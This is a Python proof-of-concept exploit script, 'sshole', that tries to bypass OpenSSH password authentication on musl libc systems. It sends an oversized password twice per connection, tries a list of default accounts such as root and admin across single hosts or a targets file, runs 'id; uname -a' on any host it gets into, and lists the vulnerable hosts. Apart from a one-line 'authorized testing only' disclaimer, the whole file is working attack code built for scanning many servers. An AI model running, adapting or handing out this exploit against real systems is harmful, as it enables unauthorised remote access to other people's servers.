#!/usr/bin/env python3
"""
sshole PoC - OpenSSH + musl libc Auth Bypass
For authorized internal infrastructure testing only.
"""
import argparse
import sys
import time
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException

DEFAULT_USERS = ["alpine", "root", "deploy", "admin", "ubuntu", "ctf"]

# Sentinel returned by attempt_bypass when the connection timed out.
TIMEOUT = "TIMEOUT"

def parse_targets_file(path, default_port):
    """Read a newline-separated targets file. Returns list of (host, port)."""
    targets = []
    with open(path, "r") as f:
        for lineno, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                host, port_str = line.rsplit(":", 1)
                try:
                    port = int(port_str)
                except ValueError:
                    print(f"[-] {path}:{lineno}: bad port in '{line}', skipping")
                    continue
            else:
                host, port = line, default_port
            targets.append((host, port))
    return targets

def attempt_bypass(host, port, username, timeout=10):
    """
    Attempts the sshole bypass on a single connection.
    Returns True on success, TIMEOUT on connection timeout, False otherwise.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    payload = "A" * 300

    try:
        try:
            client.connect(
                hostname=host, port=port, username=username,
                password=payload, look_for_keys=False,
                allow_agent=False, timeout=timeout
            )
            print(f"[+] Success on first attempt for user '{username}'!")
            return True
        except AuthenticationException:
            pass
        except SSHException as e:
            msg = str(e)
            if "timed out" in msg.lower() or "timeout" in msg.lower():
                print(f"[-] Timeout during warm-up for '{username}': {e}")
                return TIMEOUT
            if "No existing session" in msg or "Socket is closed" in msg:
                print(f"[-] Connection lost during warm-up for '{username}': {e}")
                return False

        time.sleep(0.5)

        transport = client.get_transport()
        if transport is None or not transport.is_active():
            print(f"[-] Transport died after first attempt for '{username}'. Penalty?")
            return False

        try:
            transport.auth_password(username, payload)
            print(f"[+] SUCCESS: Logged in as '{username}' on second attempt!")
            chan = transport.open_session()
            chan.exec_command("id; uname -a")
            output = chan.makefile().read().decode(errors='replace')
            print(f"[+] Command output:\n{output}")
            return True
        except AuthenticationException:
            print(f"[-] Failed: Second authentication attempt rejected for '{username}'.")
            return False
        except SSHException as e:
            msg = str(e)
            if "timed out" in msg.lower() or "timeout" in msg.lower():
                print(f"[-] Timeout on attempt 2 for '{username}': {e}")
                return TIMEOUT
            print(f"[-] SSH Exception on attempt 2 for '{username}': {e}")
            return False

    except Exception as e:
        msg = str(e)
        if "timed out" in msg.lower() or "timeout" in msg.lower():
            print(f"[-] Timeout for '{username}': {e}")
            return TIMEOUT
        print(f"[-] Unexpected error for '{username}': {e}")
        return False
    finally:
        client.close()

def test_target(host, port, users, delay):
    """
    Try all candidate users against one target.
    Returns (host, port, user) on success, ('TIMEOUT', host, port) on timeout, else None.
    """
    print(f"\n[*] Testing {host}:{port}")
    for i, user in enumerate(users):
        if i > 0:
            time.sleep(delay)
        print(f"[*] Trying user '{user}'...")
        result = attempt_bypass(host, port, user)
        if result is True:
            return (host, port, user)
        if result == TIMEOUT:
            print(f"[!] Timeout on {host}:{port} with user '{user}' — skipping remaining accounts.")
            return (TIMEOUT, host, port)
    return None

def main():
    parser = argparse.ArgumentParser(description="sshole OpenSSH/musl Auth Bypass PoC")
    parser.add_argument("--host", help="Single target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=22, help="Default SSH port (default: 22)")
    parser.add_argument("-u", "--user", help="Target username (must have '*' in /etc/shadow). If omitted, tries a default list.")
    parser.add_argument("--targets", help="Path to a newline-separated targets file (host or host:port per line)")
    parser.add_argument("--delay", type=float, default=1.0, help="Seconds between account attempts (default: 1.0)")
    parser.add_argument("--host-delay", type=float, default=2.0, help="Seconds between targets in a file (default: 2.0)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-connection timeout in seconds (default: 10.0)")
    args = parser.parse_args()

    if not args.host and not args.targets:
        parser.error("either --host or --targets is required")

    users = [args.user] if args.user else DEFAULT_USERS

    if args.targets:
        try:
            targets = parse_targets_file(args.targets, args.port)
        except FileNotFoundError:
            print(f"[-] Targets file not found: {args.targets}")
            sys.exit(1)
        if not targets:
            print(f"[-] No usable targets in {args.targets}")
            sys.exit(1)
    else:
        targets = [(args.host, args.port)]

    print(f"[*] Will test {len(targets)} target(s)")
    print(f"[*] Will try user(s): {', '.join(users)}")

    successes = []
    timeouts = []
    for idx, (host, port) in enumerate(targets):
        if idx > 0:
            time.sleep(args.host_delay)
        result = test_target(host, port, users, args.delay)
        if result is None:
            continue
        if result[0] == TIMEOUT:
            timeouts.append((result[1], result[2]))
            continue
        host, port, user = result
        print(f"\n[!!!] VULNERABLE: {host}:{port} bypassed via '{user}'.")
        print("[*] Check server logs for 'Accepted password' to confirm.")
        successes.append(result)

    print("\n" + "=" * 60)
    if successes:
        print(f"[+] {len(successes)} vulnerable target(s):")
        for host, port, user in successes:
            print(f"    {host}:{port}  (user: {user})")
    if timeouts:
        print(f"[!] {len(timeouts)} target(s) timed out (skipped remaining accounts):")
        for host, port in timeouts:
            print(f"    {host}:{port}")
    if not successes and not timeouts:
        print("[*] No vulnerable targets found among the tried accounts.")

    sys.exit(0 if successes else 1)

if __name__ == "__main__":
    main()
